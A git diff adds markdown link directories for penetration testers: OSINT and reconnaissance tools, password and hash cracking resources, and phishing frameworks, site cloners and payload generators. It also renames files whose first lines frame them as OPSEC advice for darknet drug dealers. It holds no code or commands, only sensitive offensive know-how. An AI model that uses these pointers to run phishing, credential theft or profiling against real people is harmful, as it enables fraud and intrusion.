+* [orbis](https://orbisdirectory.bvdinfo.com/version-2017821/OrbisDirectory/Companies)
+
+  * Company information across the globe
+
+#### CVS/Git/Similar Focused
+
+* [repo-supervisor](https://github.com/auth0/repo-supervisor)
+* [GitPrey](https://github.com/repoog/GitPrey)
+
+  * GitPrey is a tool for searching sensitive information or data according to
+    company name or key word something.The design mind is from searching
+    sensitive data leakling in Github:
+
+* [git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
+
+  * A tool to capture all the git secrets by leveraging multiple open source git
+    searching tools
+
+* [github-firehose](https://www.npmjs.com/package/github-firehose)
+
+  * A library that will connect to github and emit events from the Github Event
+    API in near-real-time
+  * [Exploring the Github Firehose](http://blog.scalyr.com/2013/10/exploring-the-github-firehose/)
+
+* [Gitem](https://github.com/mschwager/gitem)
+
+  * Gitem is a tool for performing Github organizational reconnaissance.
+
+* [Truffle Hog](https://github.com/dxa4481/truffleHog)
+
+  * Searches through git repositories for high entropy strings, digging deep
+    into commit history and branches. This is effective at finding secrets
+    accidentally committed that contain high entropy.
+
+* [dvcs-ripper](https://github.com/kost/dvcs-ripper)
+
+  * Rip web accessible (distributed) version control systems: SVN, GIT,
+    Mercurial/hg, bzr, ... It can rip repositories even when directory browsing
+    is turned off.
+
+* [Truffle Hog](https://github.com/dxa4481/truffleHog)
+
+  * Searches through git repositories for high entropy strings, digging deep
+    into commit history
+
+#### DNS Stuff
+
+* [dauntless](https://github.com/cmeister2/dauntless)
+
+  * Tools for analysing the forward DNS data set published at
+    https://scans.io/study/sonar.fdns_v2
+
+* [dnstwist](https://github.com/elceef/dnstwist)
+
+  * Domain name permutation engine for detecting typo squatting, phishing and
+    corporate espionage
+
+* [typofinder](https://github.com/nccgroup/typofinder)
+
+  * Typofinder for domain typo discovery
+
+#### Email Gathering/Reconnaissance
+
+* [OSINT Through Sender Policy Framework Records](https://community.rapid7.com/community/infosec/blog/2015/02/23/osint-through-sender-policy-framework-spf-records)
+* [SimplyEmail](https://github.com/killswitch-GUI/SimplyEmail)
+
+  * What is the simple email recon tool? This tool was based off the work of
+    theHarvester and kind of a port of the functionality. This was just an
+    expansion of what was used to build theHarvester and will incorporate his
+    work but allow users to easily build Modules for the Framework. Which I felt
+    was desperately needed after building my first module for theHarvester.
+
+* [Email Reconnaissance and Phishing Template Generation Made Simple](https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/)
+* [theHarvester](https://github.com/laramies/theHarvester)
+
+  * theHarvester is a tool for gathering e-mail accounts, subdomain names,
+    virtual hosts, open ports/ banners, and employee names from different public
+    sources (search engines, pgp key servers).
+
+* [discover.sh](https://github.com/leebaird/discover)
+
+  * For use with Kali Linux. Custom bash scripts used to automate various
+    pentesting tasks.
+
+#### Fancy Search Engines
+
+* [Entity Cube](http://entitycube.research.microsoft.com/)
+
+  * EntityCube is a research prototype for exploring object-level search
+    technologies, which automatically summarizes the Web for entities (such as
+    people, locations and organizations) with a modest web presence.
+
+* [Silobreaker](http://www.silobreaker.com/)
+
+  * Enterprise Semantic Search Engine, allows virtualisation of data, analytics
+    and exploration of key data.
+
+* [iSeek](http://www.iseek.com/#/web)
+
+  * Another handy search engine that break results down into easy to manage
+    categories.
+
+* [Carrot2](http://search.carrot2.org/stable/search)
+
+  * Carrot2 organizes your search results into topics. With an instant overview
+    of what's available, you will quickly find what you're looking for.
+
+* [Sqoop](http://sqoop.com/)
+
+  * OSINT search engine of public documents(handy)
+
+* [GlobalFileSearch](https://ftplike.com)
+
+  * An FTP Search Engine that may come in handy.
+
+#### General Meta Data
+
+* [Just-Metadata](https://github.com/ChrisTruncer/Just-Metadata)
+
+  * Just-Metadata is a tool that can be used to gather intelligence information
+    passively about a large number of IP addresses, and attempt to extrapolate
+    relationships that might not otherwise be seen. Just-Metadata has "gather"
+    modules which are used to gather metadata about IPs loaded into the
+    framework across multiple resources on the internet. Just-Metadata also has
+    "analysis" modules. These are used to analyze the data loaded Just-Metadata
+    and perform various operations that can identify potential relationships
+    between the loaded systems.
+
+* [MetaGooFil](https://code.google.com/p/metagoofil/)
+
+  * Description: Metagoofil is an information gathering tool designed for
+    extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx)
+    belonging to a target company. The tool will perform a search in Google to
+    identify and download the documents to local disk and then will extract the
+    metadata with different libraries like Hachoir, PdfMiner and others. With
+    the results it will generate a report with usernames, software versions and
+    servers or machine names that will help Penetration testers in the
+    information gathering phase.
+
+* [Metashield Analyzer](https://metashieldanalyzer.elevenpaths.com/)
+
+  * Description: Metadata documents can help a malicious user to obtain
+    information that is beyond our control in an enterprise environment.
+    Metashield Analyzer is an online service that allows easily check if your
+    office documents contain metadata.
+
+* [PowerMeta](https://github.com/dafthack/PowerMeta)
+
+  * PowerMeta searches for publicly available files hosted on various websites
+    for a particular domain by using specially crafted Google, and Bing
+    searches. It then allows for the download of those files from the target
+    domain. After retrieving the files, the metadata associated with them can be
+    analyzed by PowerMeta. Some interesting things commonly found in metadata
+    are usernames, domains, software titles, and computer names.
+
+#### General Data Scrapers
+
+* [XRAY](https://github.com/evilsocket/xray)
+
+  * XRay is a tool for recon, mapping and OSINT gathering from public networks.
+
+* [NameCheck](https://www.namecheck.com)
+
+  * Search usernames across multiple services/domain registries
+
+* [TheHarvester](https://code.google.com/p/theharvester/)
+
+  * Description: The objective of this program is to gather emails, subdomains,
+    hosts, employee names, open ports and banners from different public sources
+    like search engines, PGP key servers and SHODAN computer database. This tool
+    is intended to help Penetration testers in the early stages of the
+    penetration test in order to understand the customer footprint on the
+    Internet. It is also useful for anyone that wants to know what an attacker
+    can see about their organization.
+
+* [OSINT OPSEC Tool](https://github.com/hyprwired/osint-opsec-tool)
+
+  * Description: The OSINT OPSEC Tool monitors multiple 21st Century OSINT
+    sources real-time for keywords, then analyses the results, generates alerts,
+    and maps trends of the data, finding all sorts of info people probably don't
+    want others to see...
+
+#### Google Hacking
+
+* [Google Hacking for Penetration Testers](https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf)
+* [ExpoitDB archive of the google hacking database](http://www.exploit-db.com/google-dorks/)
+* [Google Hacking Database](http://www.hackersforcharity.org/ghdb/)
+
+  * We call them 'googledorks': Inept or foolish people as revealed by Google.
+    Whatever you call these fools, you've found the center of the Google Hacking
+    Universe!
+
+* [Google Hacking - Search Diggity tool](http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/)
+
+  * SearchDiggity 3.1 is the primary attack tool of the Google Hacking Diggity
+    Project. It is Bishop Fox’s MS Windows GUI application that serves as a
+    front-end to the most recent versions of our Diggity tools: GoogleDiggity,
+    BingDiggity, Bing LinkFromDomainDiggity, CodeSearchDiggity, DLPDiggity,
+    FlashDiggity, MalwareDiggity, PortScanDiggity, SHODANDiggity,
+    BingBinaryMalwareSearch, and NotInMyBackYard Diggity.
+
+* [GoogD0rker](https://github.com/ZephrFish/GoogD0rker)
+
+  * GoogD0rker is a tool for firing off google dorks against a target domain, it
+    is purely for OSINT against a specific target domain. Designed for OSX
+    originally however googD0rker txt now works on all nix platforms.
+
+### Network Information Search Engines
+
+* [Whoisology](https://whoisology.com/)
+
+  * Whoisology is a domain name ownership archive with literally billions of
+    searchable and cross referenced domain name whois records.
+
+##### Site Specific
+
+* AWS
+
+  * [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)
+    * AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for
+      loot. It's similar to a subdomain bruteforcer but is made specifically for
+      S3 buckets and also has some extra features that allow you to grep for
+      delicious files as well as download interesting files if you're not afraid
+      to quickly fill up your hard drive.
+
+* LinkedIn
+
+  * [InSpy](https://github.com/gojhonny/InSpy)
+    * A LinkedIn enumeration tool
+  * [linkedin](https://github.com/eracle/linkedin)
+    * Linkedin Scraper using Selenium Web Driver, Firefox 45, Ubuntu and Scrapy
+  * [LinkedInt: A LinkedIn scraper for reconnaissance during adversary simulation](https://github.com/mdsecactivebreach/LinkedInt)
+  * [LinkedIn Gatherer](https://github.com/DisK0nn3cT/linkedin-gatherer)
+  * [socilab](http://socilab.com/#home)
+    * This site allows users to visualize and analyze their LinkedIn network
+      using methods derived from social-scientific research. Full sample output
+      is shown here. The site is free and open-source. Have fun!
+
+* Twitter
+
+  * [OneMillionTweetMap](http://onemilliontweetmap.com/)
+    * This page maps the last geolocalized tweets delivered by the twitter
+      stream API. YES - IN REAL-TIME - and we keep "only" the last one million
+      tweets.
+  * [tweets_analyzer](https://github.com/x0rz/tweets_analyzer)
+    * Tweets metadata scraper & activity analyzer
+  * [Tweet Archivist](https://www.tweetarchivist.com/)
+  * [tweets_analyzer](https://github.com/x0rz/tweets_analyzer)
+    * Tweets metadata scraper & activity analyzer
+  * [Tinfoleak](http://vicenteaguileradiaz.com/tools/)
+    * tinfoleak is a simple Python script that allow to obtain: basic
+      information about a Twitter user (name, picture, location, followers,
+      etc.); devices and operating systems used by the Twitter user;
+      applications and social networks used by the Twitter user; place and
+      geolocation coordinates to generate a tracking map of locations visited;
+      show user tweets in Google Earth!; download all pics from a Twitter user;
+      hashtags used by the Twitter user and when are used (date and time); user
+      mentions by the the Twitter user and when are occurred (date and time);
+      topics used by the Twitter user
+
+* Github
+  * [Github dorks - finding vulns](http://blog.conviso.com.br/2013/06/github-hacking-for-fun-and-sensitive.html)
+
+### Social Media Search/Enumeration
+
+* [CheckUsernames](http://checkusernames.com/)
+
+  * Check the use of your brand or username on 160 Social Networks
+
+* [NameCHK](https://namechk.com/)
+
+  * Check to see if your desired username or vanity url is still available at
+    dozens of popular Social Networking and Social Bookmarking websites.
+
+* [Scythe](https://github.com/ChrisJohnRiley/Scythe)
+
+  * The ability to test a range of email addresses across a range of sites (e.g.
+    social media, blogging platforms, etc...) to find where those targets have
+    active accounts. This can be useful in a social engineering test where you
+    have email accounts for a company and want to list where these users have
+    used their work email for 3rd party web based services.
+
+* [Social Mention](http://www.socialmention.com/)
+
+  * Social Mention is a social media search engine that searches user-generated
+    content such as blogs, comments, bookmarks, events, news, videos, and more
+
+* [Whos Talkin](http://www.whostalkin.com/)
+
+  * Social media search tool that allows users to search for conversations
+    surrounding the topics that they care about most.
diff --git a/Draft/Opsec_rant-alpraking.md b/source/Opsec-rant-alpraking.md
old mode 100755
new mode 100644
similarity index 99%
rename from Draft/Opsec_rant-alpraking.md
rename to source/Opsec-rant-alpraking.md
index 9a00e39..29ef592
--- a/Draft/Opsec_rant-alpraking.md
+++ b/source/Opsec-rant-alpraking.md
@@ -1,3 +1,5 @@
+# Alpraking's OPSEC Rant
+
 Alpraking's OPSEC guide to being a successful kingpin. 
 submitted 5 hours ago * by AlpraKing
 For sale only $1999.97 unti.....
diff --git a/Draft/Opsec_rant2-nachash.md b/source/Opsec-rant2-nachash.md
old mode 100755
new mode 100644
similarity index 99%
rename from Draft/Opsec_rant2-nachash.md
rename to source/Opsec-rant2-nachash.md
index 2116976..b77a3d6
--- a/Draft/Opsec_rant2-nachash.md
+++ b/source/Opsec-rant2-nachash.md
@@ -1,3 +1,5 @@
+# Nachash's OPSEC Rant
+
 So, you want to be a darknet drug lord...
 by nachash
 nachash@observers.net
diff --git a/source/Password-Bruting-and-Hashcracking.md b/source/Password-Bruting-and-Hashcracking.md
new file mode 100644
index 0000000..707e112
--- /dev/null
+++ b/source/Password-Bruting-and-Hashcracking.md
@@ -0,0 +1,287 @@
+# Password Bruting and Hashcracking
+
+### TOC
+
+* [General](#general)
+* [Making Better Passwords](#better)
+* [Cracking Passwords/Hashes](#crack)
+* [General Cracking Tools](#generalt)
+* [App Specific Tools](#appt)
+* [Write-ups/Guides](#writeup)
+* [Miscellaneous](#misc)
+* [Wordlists](#wordlist)
+* [Wordlist Generation](#)
+* [Talks & Presentations](#)
+* [Papers](#papers)
+
+### Cull
+
+* http://blog.erratasec.com/2011/06/password-cracking-mining-and-gpus.html#.VG3xspPF_tw
+* http://arstechnica.com/security/2013/03/how-i-became-a-password-cracker/
+* [Gladius](https://github.com/praetorian-inc/gladius)
+
+  * Automated Responder/secretsdump.py cracking. Gladius provides an automated
+    method for cracking credentials from various sources during an engagement.
+    We currently crack hashes from Responder, secretsdump.py, and
+    smart_hashdump.
+  * Wordlists sorted by popularity originally created for password generation
+    and testing
+
+### General
+
+* [HashView](https://github.com/hashview/hashview)
+
+  * Hashview is a tool for security professionals to help organize and automate
+    the repetitious tasks related to password cracking. Hashview is a web
+    application that manages hashcat (https://hashcat.net) commands. Hashview
+    strives to bring constiency in your hashcat tasks while delivering analytics
+    with pretty pictures ready for ctrl+c, ctrl+v into your reports.
+
+* [Hashtag](http://www.smeegesec.com/2013/11/hashtag-password-hash-identification.html)
+
+  * Password hash identification tool written in python
+
+* [List of hash types/examples](https://docs.google.com/file/d/0B0TzWBRmg5pWWUtxRTFMbFRRZzA/edit)
+* [Password Recovery Speeds](http://www.lockdown.co.uk/?pg=combi)
+
+  * Password cracking time measurements
+
+### Making Better Passwords
+
+* [Mnemonic Password Formulas](http://uninformed.org/?v=all&a=33&t=sumry)
+
+  * The current information technology landscape is cluttered with a large
+    number of information systems that each have their own individual
+    authentication schemes. Even with single sign-on and multi-system
+    authentication methods, systems within disparate management domains are
+    likely to be utilized by users of various levels of involvement within the
+    landscape as a whole. Due to this complexity and the abundance of
+    authentication requirements, many users are required to manage numerous
+    credentials across various systems. This has given rise to many different
+    insecurities relating to the selection and management of passwords. This
+    paper details a subset of issues facing users and managers of authentication
+    systems involving passwords, discusses current approaches to mitigating
+    those issues, and finally introduces a new method for password management
+    and recalls termed Mnemonic Password Formulas.
+
+### crack Cracking Passwords/Hashes
+
+* [Introduction to Cracking Hashes](http://n0where.net/introduction-break-that-hash/)
+
+  * Good introduction source to hash cracking.
+
+* [Cracking Corporate Passwords Exploiting Password Policy Weaknesses - Minga Rick Redm - Derbycon3](https://www.youtube.com/watch?v=qR-qRUbeKAo)
+* [HashView](https://github.com/hashview/hashview)
+
+  * Hashview is a tool for security professionals to help organize and automate
+    the repetitious tasks related to password cracking. Hashview is a web
+    application that manages hashcat (https://hashcat.net) commands. Hashview
+    strives to bring constiency in your hashcat tasks while delivering analytics
+    with pretty pictures ready for ctrl+c, ctrl+v into your reports.
+
+* [Cracking Active Directory Passwords or How to Cook AD Crack"](https://www.sans.org/reading-room/whitepapers/testing/cracking-active-directory-passwords-how-cook-ad-crack-37940)
+* [Cracking Corporate Passwords Exploiting Password Policy Weaknesses - Minga / Rick Redman Derbycon 2013](https://www.irongeek.com/i.php?page=videos/derbycon3/1301-cracking-corporate-passwords-exploiting-password-policy-weaknesses-minga-rick-redman)
+
+### App Specific Tools(as in single application focus)
+
+* [crackxls2003 0.4](https://github.com/GavinSmith0123/crackxls2003)
+
+  * This program may be used to break the encryption on Microsoft Excel and
+    Microsoft Word file which have been encrypted using the RC4 method, which
+    uses a 40-bit-long key. This was the default encryption method in Word and
+    Excel 97/2000/2002/2003. This program will not work on files encrypted using
+    Word or Excel 2007 or later, or for versions 95 or earlier. It will not work
+    if a file was encrypted with a non-default method. Additionally, documents
+    created with the Windows system locale set to France may use a different
+    encryption method.
+
+#### OCL/Hashcat
+
+* [OCL hashcat wiki](http://hashcat.net/wiki/)
+
+  * Its the Wiki
+
+* [OCL hashcat](http://n0where.net/introduction-break-that-hash/)
+
+  * Its OCL hashcat
+
+### Hashcat attacks
+
+* [Mask atttack](http://hashcat.net/wiki/doku.php?id=mask_attack)
+
+  * Try all combinations from a given keyspace just like in Brute-Force attack,
+    but more specific.
+
+* [Combinator attack](http://hashcat.net/wiki/doku.php?id=combinator_attack)
+
+  * Each word of a dictionary is appended to each word in a dictionary.
+
+* [Dictionary attack](http://hashcat.net/wiki/doku.php?id=dictionary_attack)
+
+  * The dictionary attack is a very simple attack mode. It is also known as a
+    Wordlist attack.
+
+* [Fingerprint Attack](http://hashcat.net/wiki/doku.php?id=fingerprint_attack)
+
+  * The Fingerprint attack is a combination of the results of the expander with
+    a combination engine. It is an automatically generated attack on pattern
+    that works fine on GPGPU.
+
+* [Hybrid attack](http://hashcat.net/wiki/doku.php?id=hybrid_attack)
+
+  * Basically, the hybrid attack is just a Combinator attack. One side is simply
+    a dictionary, the other is the result of a Brute-Force attack. In other
+    words, the full Brute-Force keyspace is either appended or prepended to each
+    of the words from the dictionary. That's why it's called hybrid.
+
+* [Mask attack](http://hashcat.net/wiki/doku.php?id=mask_attack)
+
+  * Try all combinations from a given keyspace just like in Brute-Force attack,
+    but more specific.
+
+* [Permutation attack](http://hashcat.net/wiki/doku.php?id=permutation_attack)
+
+  * Each word in a dictionary generates all permutations of itself.
+
+* [Rule Based attack](http://hashcat.net/wiki/doku.php?id=rule_based_attack)
+
+  * The rule-based attack is one of the most complicated of all the attack
+    modes. The reason for this is very simple. The rule-based attack is like a
+    programming language designed for password candidate generation. It has
+    functions to modify, cut or extend words and has conditional operators to
+    skip some, etc. That makes it the most flexible, accurate and efficient
+    attack.
+
+* [Table Lookup attack](http://hashcat.net/wiki/doku.php?id=table_lookup_attack)
+
+  * With each word in our dictionary, it automatically generates masks as in a
+    batch of Mask attack.
+
+* [Toggle-Case attack](http://hashcat.net/wiki/doku.php?id=toggle_case_attack)
+
+  * For each word in a dictionary, all possible combinations of upper- and
+    lower-case variants are generated.
+
+* [OCLHashcat Hash Examples + hash code](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
+### Writeups
+
+* [How to crack password hashes efficiently](http://www.dafthack.com/blog/howtocrackpasswordhashesefficiently)
+
+  * Excellent writeup/methodology explanation
+
+* [Building a Better GPU based hash cracking methodology](https://blog.netspi.com/gpu-password-cracking-building-a-better-methodology/)
+
+  * Bit basic advice but still great advice nonetheless
+
+* [5min Guide to setting up a GPU cracker in the cloud on AWS + a script to automate it all](http://thehackerblog.com/amazon-ec2-gpu-hvm-spot-instance-cracking-setup-tutorial/)
+* [Dumping a Domains worth of passwords using mimikatz](http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html)
+* [Dump Windows password hashes efficiently - Part 1](http://www.bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)
+
+### Tools
+
+* [Patator](https://github.com/lanjelot/patator)
+
+  * Patator was written out of frustration from using Hydra, Medusa, Ncrack,
+    Metasploit modules and Nmap NSE scripts for password guessing attacks. I
+    opted for a different approach in order to not create yet another
+    brute-forcing tool and avoid repeating the same shortcomings. Patator is a
+    multi-threaded tool written in Python, that strives to be more reliable and
+    flexible than his fellow predecessors.
+
+* [Firefox password cracker](https://github.com/pradeep1288/ffpasscracker)
+* [Cracklord](https://github.com/jmmcatee/cracklord)
+
+  * CrackLord is a system designed to provide a scalable, pluggable, and
+    distributed system for both password cracking as well as any other jobs
+    needing lots of computing resources. Better said, CrackLord is a way to load
+    balance the resources, such as CPU, GPU, Network, etc. from multiple
+    hardware systems into a single queueing service across two primary services:
+    the Resource and Queue. It won't make these tasks faster, but it will make
+    it easier to manage them.
+
+* [Dagon](https://github.com/Ekultek/Dagon)
+
+  * Named after the prince of Hell, Dagon (day-gone) is an advanced hash
+    cracking and manipulation system, capable of bruteforcing multiple hash
+    types, creating bruteforce dictionaries, automatic hashing algorithm
+    verification, random salt generation from Unicode to ASCII, and much more.
+
+### Wordlist Generation
+
+* [GitDigger](https://github.com/wick2o/gitdigger)
+
+  * gitDigger: Creating realworld wordlists from github hosted data.
+
+* [Wikigen](https://github.com/zombiesam/wikigen)
+
+  * A script to generate wordlists out of wikipedia pages. Should support most
+    of the subdomains. Some ugly code may occur
+
+* [CeWL](http://digi.ninja/projects/cewl.php)
+
+  * CeWL is a ruby app which spiders a given url to a specified depth,
+    optionally following external links, and returns a list of words which can
+    then be used for password crackers such as John the Ripper.
+
+* [Generating Wordlists](http://netsec.ws/?p=457)
+* [Creating Wordlists with Crunch](http://adaywithtape.blogspot.com/2011/05/creating-wordlists-with-crunch-v30.html)
+
+### Wordlists
+
+* [Crackstations Password Cracking Dictionary 1.5b words](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)
+
+  * HIGHLY recommended
+
+* [WPA/WPA2 Dictionaries](https://wifi0wn.wordpress.com/wepwpawpa2-cracking-dictionary/)
+* [SkullSecurity Password lists](https://wiki.skullsecurity.org/Passwords)
+* [CrackStations Password Cracking Dictionary](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)
+* [Crack Me if You Can - Defcon 2010](http://contest-2010.korelogic.com/wordlists.html)
+* [BEWGor](https://github.com/berzerk0/BEWGor)
+
+  * Bull's Eye Wordlist Generator
+
+* [Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)
+
+  * Wordlists sorted by probability originally created for password generation
+    and testing
+
+* [BEWGor](https://github.com/berzerk0/BEWGor)
+
+  * Bull's Eye Wordlist Generator
+
+* [Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)
+
+  * Wordlists sorted by probability originally created for password generation
+    and testing
+
+### Talks & Presentations
+
+* [Cracking Corporate Passwords Exploiting Password Policy Weaknesses - Minga Rick Redm - Derbycon3](https://www.youtube.com/watch?v=qR-qRUbeKAo)
+
+### Papers
+
+* [Optimizing computation of Hash Algorithms as an attacker](https://hashcat.net/events/p13/js-ocohaaaa.pdf)
+* [Attacking NTLM with Precomputed Hashtables](http://uninformed.org/?v=all&a=13&t=sumry)
+
+  * Breaking encrypted passwords has been of interest to hackers for a long
+    time, and protecting them has always been one of the biggest security
+    problems operating systems have faced, with Microsoft's Windows being no
+    exception. Due to errors in the design of the password encryption scheme,
+    especially in the LanMan(LM) scheme, Windows has a bad track in this field
+    of information security. Especially in the last couple of years, where the
+    outdated DES encryption algorithm that LanMan is based on faced more and
+    more processing power in the average household, combined with ever
+    increasing harddisk size, made it crystal clear that LanMan nowadays is not
+    just outdated, but even antiquated.
+
+* [Website Dedicated to Password Research](http://www.passwordresearch.com/papers/pubindex.html)
+
+  * A core objective of the Password Research Institute is to improve the
+    industry awareness of existing authentication research. Many valuable
+    solutions for the problems associated with authentication have gone
+    unnoticed by the people interested in, or responsible for, authentication
+    security. This project will compile and share a comprehensive, but
+    moderated, index of password and authentication related research papers. We
+    aim to share the details of useful papers, provide access to the papers, and
+    encourage collaboration between authors and other security professionals.
diff --git a/source/Phishing.md b/source/Phishing.md
new file mode 100644
index 0000000..1c2b9f8
--- /dev/null
+++ b/source/Phishing.md
@@ -0,0 +1,277 @@
+# Phishing
+
+### TOC
+
+* [General](#general)
+* [Phishing Frameworks](#framework)
+* [Phishing Guides](#guides)
+* [Phishing Writeups](#writeup)
+
+### Cull
+
+* [Client Identification Mechanisms](http://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
+
+### General
+
+* General
+
+  * [Phishing - wikipedia](http://www.en.wikipedia.org/wiki/Phishing)
+
+    * Phishing is the attempt to acquire sensitive information such as
+      usernames, passwords, and credit card details (and sometimes, indirectly,
+      money) by masquerading as a trustworthy entity in an electronic
+      communication.
+
+  * [Post exploitation trick - Phish users for creds on domains, from their own box](https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/)
+
+* Articles/Blogposts
+
+  * [Top 10 Email Subjects for Company Phishing Attacks](http://www.pandasecurity.com/mediacenter/security/top-10-email-subjects-phishing-attacks/)
+  * [Some Tips for Legitimate Senders to Avoid False Positives - Apache SpamAssassin](https://wiki.apache.org/spamassassin/AvoidingFpsForSenders)
+  * [Email Delivery What Pen Testers Should Know - cs](https://blog.cobaltstrike.com/2013/10/03/email-delivery-what-pen-testers-should-know/)
+  * [Whats the go-to phishing technique or exploit? - cs](https://blog.cobaltstrike.com/2014/12/17/whats-the-go-to-phishing-technique-or-exploit/)
+  * [Phishing, Lateral Movement, SCADA, OH MY!](https://web.archive.org/web/20160408193653/http://www.idzer0.com/?p=210)
+
+* Papers
+
+  * [Tab Napping - Phishing](http://www.exploit-db.com/papers/13950/)
+  * [Skeleton in the closet. MS Office vulnerability you didnt know about](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about)
+    * Microsoft Equation Editor Exploit writeup
+  * [MetaPhish Paper](https://www.blackhat.com/presentations/bh-usa-09/SMITH_VAL/BHUSA09-Smith-MetaPhish-PAPER.pdf)
+
+* Writeups
+
+  * [How do I phish? Advanced Email Phishing Tactics - Pentest Geek](https://www.pentestgeek.com/2013/01/30/how-do-i-phish-advanced-email-phishing-tactics/)
+  * [Real World Phishing Techniques - Honeynet Project](http://www.honeynet.org/book/export/html/89)
+
+### Documentation
+
+* [Sender Policy Framework - Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework)
+* [DomainKeys Identified Mail - Wikipedia](https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail)
+* [DMARC - Wikipedia](https://en.wikipedia.org/wiki/DMARC)
+* [Domain-based Message Authentication, Reporting, and Conformance (DMARC) - RFC7489](https://tools.ietf.org/html/rfc7489)
+* [SPF, DKIM, and DMARC Demystified - McAfee](https://jira.sakaiproject.org/secure/attachment/43722/sb-spf-dkim-dmarc-demystified.pdf)
+* [Add commands to your presentation with action buttons](https://support.office.com/en-us/article/Add-commands-to-your-presentation-with-action-buttons-7db2c0f8-5424-4780-93cb-8ac2b6b5f6ce)
+
+  * Add commands to your presentation with action buttons
+
+* [SMTP Strict Transport Security](https://lwn.net/Articles/684462/)
+
+### framework Phishing Frameworks:
+
+* [Phishing Frenzy](http://www.phishingfrenzy.com/)
+
+  * Phishing Frenzy is an Open Source Ruby on Rails application that is
+    leveraged by penetration testers to manage email phishing campaigns. The
+    goal of the project is to streamline the phishing process while still
+    providing clients the best realistic phishing campaign possible. This goal
+    is obtainable through campaign management, template reuse, statistical
+    generation, and other features the Frenzy has to offer.
+
+* [sptoolkit](https://github.com/sptoolkit/sptoolkit)
+
+  * Simple Phishing Toolkit is a super easy to install and use phishing
+    framework built to help Information Security professionals find human
+    vulnerabilities
+
+* [sptoolkit-rebirth](https://github.com/simplephishingtoolkit/sptoolkit-rebirth)
+
+  * sptoolkit hasn't been actively developed for two years. As it stands, it's a
+    brilliant peice of software, and the original developers are pretty damn
+    awesome for creating it. But we'd like to go further, and bring sptoolkit up
+    to date. We've tried contacting the developers, but to no avail. We're
+    taking matters into our own hands now.
+
+* [KingPhisher](https://github.com/securestate/king-phisher)
+
+  * King Phisher is a tool for testing and promoting user awareness by
+    simulating real world phishing attacks. It features an easy to use, yet very
+    flexible architecture allowing full control over both emails and server
+    content. King Phisher can be used to run campaigns ranging from simple
+    awareness training to more complicated scenarios in which user aware content
+    is served for harvesting credentials.
+
+* [Gophish](https://github.com/gophish/gophish)
+
+  * Gophish is an open-source phishing toolkit designed for businesses and
+    penetration testers. It provides the ability to quickly and easily setup and
+    execute phishing engagements and security awareness training.
+  * [gophish documentation](https://getgophish.com/documentation/)
+
+* [TackleBox](https://github.com/trailofbits/tacklebox)
+* [king-phisher](https://github.com/securestate/king-phisher)
+
+  * Phishing Campaign Toolkit
+
+#### Tools - Cloning
+
+* [Cooper](https://github.com/chrismaddalena/Cooper)
+
+  * Cooper simplifies the process of cloning a target website or email for use
+    in a phishing campaign. Just find a URL or download the raw contents of an
+    email you want to use and feed it to Cooper. Cooper will clone the content
+    and then automatically prepare it for use in your campaign. Scripts, images,
+    and CSS can be modified to use direct links instead of relative links, links
+    are changed to point to your phishing server, and forms are updated to send
+    data to you -- all in a matter of seconds. Cooper is cross-platform and
+    should work with MacOS, Linux, and Windows.
+
+#### Tools - Domains
+
+* [CatMyFish](https://github.com/Mr-Un1k0d3r/CatMyFish)
+
+  * Search for categorized domain that can be used during red teaming
+    engagement. Perfect to setup whitelisted domain for your Cobalt Strike
+    beacon C&C. It relies on expireddomains.net to obtain a list of expired
+    domains. The domain availability is validated using checkdomain.com
+
+* [CatPhish](https://github.com/ring0lab/catphish)
+
+  * Generate similar-looking domains for phishing attacks. Check expired domains
+    and their categorized domain status to evade proxy categorization.
+    Whitelisted domains are perfect for your C2 servers.
+
+### Tools - Email Harvesting
+
+* [PhishBait](https://github.com/hack1thu7ch/PhishBait)
+
+  * Tools for harvesting email addresses for phishing attacks
+
+* [Email Address Harvesting for Phishing](http://www.shortbus.ninja/email-address-harvesting-for-phishing-attacks/)
+
+### Tools - Frameworks
+
+* [Cartero](https://github.com/Section9Labs/Cartero)
+
+  * Cartero is a modular project divided into commands that perform independent
+    tasks (i.e. Mailer, Cloner, Listener, AdminConsole, etc...). In addition
+    each sub-command has repeatable configuration options to configure and
+    automate your work.
+
+* [FiercePhish](https://github.com/Raikia/FiercePhish)
+
+  * FiercePhish is a full-fledged phishing framework to manage all phishing
+    engagements. It allows you to track separate phishing campaigns, schedule
+    sending of emails, and much more
+
+### Tools - Payloads
+
+* [Demiguise](https://github.com/nccgroup/demiguise)
+
+  * The aim of this project is to generate .html files that contain an encrypted
+    HTA file. The idea is that when your target visits the page, the key is
+    fetched and the HTA is decrypted dynamically within the browser and pushed
+    directly to the user.
+
+* [morphHTA - Morphing Cobalt Strike's evil.HTA](https://github.com/vysec/morphHTA)
+* [Social-Engineering-Payloads - t3ntman](https://github.com/t3ntman/Social-Engineering-Payloads)
+
+### Tools - Recon
+
+* [hackability](https://github.com/PortSwigger/hackability)
+
+  * Rendering Engine Hackability Probe performs a variety of tests to discover
+    what the unknown rendering engine supports. To use it simply extract it to
+    your web server and visit the url in the rendering engine you want to test.
+    The more successful probes you get the more likely the target engine is
+    vulnerable to attack.
+
+### Tools - Templates
+
+* [SimplyTemplate](https://github.com/killswitch-GUI/SimplyTemplate)
+
+  * Phishing Template Generation Made Easy. The goal of this project was to
+    hopefully speed up Phishing Template Gen as well as an easy way to ensure
+    accuracy of your templates. Currently my standard Method of delivering
+    emails is the Spear Phish in Cobalt strike so you will see proper settings
+    for that by defaul
+
